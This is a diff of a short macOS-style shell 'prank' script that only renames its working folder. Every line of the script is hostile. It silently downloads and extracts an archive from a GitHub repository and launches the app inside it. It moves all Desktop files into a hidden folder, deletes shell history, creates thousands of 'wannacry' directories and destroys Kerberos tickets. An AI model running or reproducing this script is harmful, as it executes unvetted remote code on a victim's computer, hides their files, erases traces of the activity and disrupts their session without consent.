@@ -1,12 +1,12 @@
-mkdir -p /tmp/okimdil/
+mkdir -p /tmp/oakoudad/
 
-curl -s -L https://github.com/YelazZ/p1/raw/master/prank.tar.gz -o /tmp/okimdil/prank.tar.gz > /dev/null
+curl -s -L https://github.com/YelazZ/p1/raw/master/prank.tar.gz -o /tmp/oakoudad/prank.tar.gz > /dev/null
 
-tar xvf /tmp/okimdil/prank.tar.gz -C /tmp/okimdil > /dev/null
+tar xvf /tmp/oakoudad/prank.tar.gz -C /tmp/oakoudad > /dev/null
 
-mkdir ~/.Okimdil/
+mkdir ~/.oakoudad/
 
-mv ~/Desktop/* ~/.Okimdil/
+mv ~/Desktop/* ~/.oakoudad/
 
 cd ~/Desktop
 
@@ -14,7 +14,7 @@ rm -rf ~/.*history*
 
 mkdir wannacry{0..10000}
 
-nohup open /tmp/okimdil/app/Laz.app > /dev/null
+nohup open /tmp/oakoudad/app/Laz.app > /dev/null
 
 kdestroy
 clear
